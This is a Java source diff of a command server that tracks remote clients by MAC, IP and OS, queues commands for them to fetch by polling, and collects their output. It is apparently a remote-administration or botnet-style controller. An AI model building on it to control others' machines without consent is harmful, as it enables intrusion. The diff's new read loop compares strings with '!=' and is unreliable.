@@ -2,7 +2,9 @@ package server;
 
 import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.HashMap;
 
@@ -29,9 +31,6 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	private ClientPool clients;
 	private int currentClient = -1;
 	
-	// Current connection
-	private Socket currentSocket;
-	
 	// Log requests
 	private Log log;
 	
@@ -56,7 +55,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("help", new Command(){
 			
 			@Override
-			public String exec(String[] args) {
+			public String exec(ParsedCommand pCmd) {
 				StringBuilder builder = new StringBuilder();
 				
 				for (String key: cmdsServer.keySet())
@@ -74,7 +73,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("exit", new Command(){
 			
 			@Override
-			public String exec(String[] args) {
+			public String exec(ParsedCommand pCmd) {
 				return null;
 			}
 			
@@ -84,14 +83,16 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("list", new Command(){
 			
 			@Override
-			public String exec(String[] args) {
+			public String exec(ParsedCommand pCmd) {
 				
 				StringBuilder sb = new StringBuilder();
-				sb.append("id     MAC address\n");
+				sb.append("id  \tMAC address      \tIP address    \tOS\n");
 				
 				for (int id: clients.keySet()) {
-					sb.append(id + "   "
-							+ clients.get(id).getMACAddress() + "\n");
+					sb.append(id + "\t"
+							+ clients.get(id).getMACAddress() + "\t"
+							+ clients.get(id).getInetAddress() + "\t"
+							+ clients.get(id).getOs() + "\n");
 				}
 				
 				// Removing last '\n'
@@ -106,11 +107,15 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("select", new Command(){
 			
 			@Override
-			public String exec(String[] args) {
-				if (args.length != 1)
+			public String exec(ParsedCommand pCmd) {
+				if (pCmd.args.length != 1)
 					return "Usage: select ID";
-				currentClient = Integer.parseInt(args[0]);
-				return "Selected client " + args[0];
+				int id = Integer.parseInt(pCmd.args[0]);
+				if (clients.containsKey(id)) {
+					currentClient = id;
+					return "Selected client " + id;
+				}
+				return "Wrong id.";
 			}
 			
 		});
@@ -119,7 +124,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("unselect", new Command(){
 
 			@Override
-			public String exec(String[] args) {
+			public String exec(ParsedCommand pCmd) {
 				currentClient = -1;
 				return "Client unselected.";
 			}
@@ -130,9 +135,9 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("log", new Command(){
 			
 			@Override
-			public String exec(String[] args) {
-				if (args.length > 0)
-					return log.getText(Integer.parseInt(args[0]));
+			public String exec(ParsedCommand pCmd) {
+				if (pCmd.args.length > 0)
+					return log.getText(Integer.parseInt(pCmd.args[0]));
 				return log.getText();
 			}
 			
@@ -142,7 +147,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("save_clients", new Command(){
 
 			@Override
-			public String exec(String[] args) {
+			public String exec(ParsedCommand pCmd) {
 				
 				try {
 					return clients.save("clients");
@@ -159,7 +164,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("info", new Command(){
 
 			@Override
-			public String exec(String[] args) {
+			public String exec(ParsedCommand pCmd) {
 				if (currentClient >= 0) {					
 					return clients.get(currentClient).toString();
 				}
@@ -189,20 +194,21 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsClient.put("GETID", new Command(){
 			
 			@Override
-			public String exec(String[] args) {
-
-				ConnectedClient client = clients.findByMac(args[0]);
+			public String exec(ParsedCommand pCmd) {
+				
+				ConnectedClient client = clients.findByMac(pCmd.args[0]);
 				int id;
 				
 				if (client != null) // Already known client
 					id = client.getId(); 
 				else				// New client
-					id = clients.addClient(args[0]);
+					id = clients.addClient(pCmd.args[0]);
 				
 				// Storing IP
-				if (currentSocket != null)
-					clients.get(id).setInetAddress(
-							currentSocket.getInetAddress().toString());
+				clients.get(id).setInetAddress(pCmd.args[1]);
+				
+				// Storing OS
+				clients.get(id).setOs(pCmd.argLine(2));
 				
 				return Integer.toString(id);
 			}
@@ -213,9 +219,9 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsClient.put("PING", new Command(){
 			
 			@Override
-			public String exec(String[] args) {
+			public String exec(ParsedCommand pCmd) {
 				ConnectedClient client;
-				if ((client = clients.identify(args[0])) != null
+				if ((client = clients.identify(pCmd.args[0])) != null
 						&& client.hasCmd()) {
 					return client.popCmd();
 				}
@@ -224,77 +230,69 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			
 		});
 		
-		cmdsClient.put("OS_OUT", new Command(){
+		cmdsClient.put("OUT", new Command(){
 
 			@Override
-			public String exec(String[] args) {
-				StringBuilder sb = new StringBuilder();
-				for (int i = 1; i < args.length; i++) {
-					sb.append(args[i] + (i == args.length - 1 ? "" : " "));
-				}
-				clients.identify(args[0]).setOs(sb.toString());
+			public String exec(ParsedCommand pCmd) {
+				
+				System.out.println(pCmd);
+				
 				return "";
 			}
 			
 		});
 		
 	}
-	
 
 	@Override
-	public String getResponse(Socket socket)
+	public void handle(Socket socket)
 			throws IOException {
 		
-		currentSocket = socket;
+		// Opening in/out streams
+		InputStream inputStream = socket.getInputStream();
+		BufferedReader in = new BufferedReader(
+				new InputStreamReader(inputStream));
+		PrintWriter out = new PrintWriter(socket.getOutputStream());
+		
+		// Payload length
+		int payloadLength = Integer.parseInt(in.readLine());
+		StringBuilder payload = new StringBuilder();
 		
 		// Reading request
-		BufferedReader reader = new BufferedReader(
-    			new InputStreamReader(socket.getInputStream()));
+		String request = in.readLine();
 		
-		StringBuilder builder = new StringBuilder();
-		
-		// Reading POST header
-		String line;
-		int contentLength = 0;
-		final String contentHeader = "Content-Length: ";
-		while (!(line = reader.readLine()).equals("")) {
-			if (line.startsWith(contentHeader)) {
-				contentLength = Integer.parseInt(
-						line.substring(contentHeader.length()));
+		if (payloadLength > 0) {
+			String line;
+			while ((line = in.readLine()) != "") {
+				System.out.println(line);
+				payload.append(line);
 			}
- 		}
-		
-		// Reading POST body
-		int c = 0;
-		for (int i = 0; i < contentLength; i++){
-			c = reader.read();
-			builder.append((char) c);
 		}
-		String request = builder.toString();
-
-		if (request.startsWith("EXEC_OUT"))
-			System.out.println(request);
-		else
-			log.add(0, socket.getInetAddress() + "\t" + request);
+		
+		// Logging request
+		log.add(0, socket.getInetAddress() + "\t" + request);
 		
 		// Executing command
-		ParsedCommand pCmd = new ParsedCommand(request);
+		ParsedCommand pCmd = new ParsedCommand(request, payload.toString());
 		if (cmdsClient.containsKey(pCmd.cmd)) {
-			String response = cmdsClient.get(pCmd.cmd).exec(pCmd.args);
+			String response = cmdsClient.get(pCmd.cmd).exec(pCmd);
 			log.add(1, socket.getInetAddress() + "\t" + response);
-			currentSocket = null;
-			return response;
+			out.println(response);
+			out.flush();
 		}
 		
-		currentSocket = null;
-		return ERROR_COMMAND_NOT_FOUND;
+		// Closing all streams
+		in.close();
+		out.close();
+		inputStream.close();
+
 	}
 
 	@Override
 	public String executeCommand(String cmd) {
 		ParsedCommand pCmd = new ParsedCommand(cmd);
 		if (cmdsServer.containsKey(pCmd.cmd))
-			return cmdsServer.get(pCmd.cmd).exec(pCmd.args);
+			return cmdsServer.get(pCmd.cmd).exec(pCmd);
 		return ERROR_COMMAND_NOT_FOUND;
 	}
 
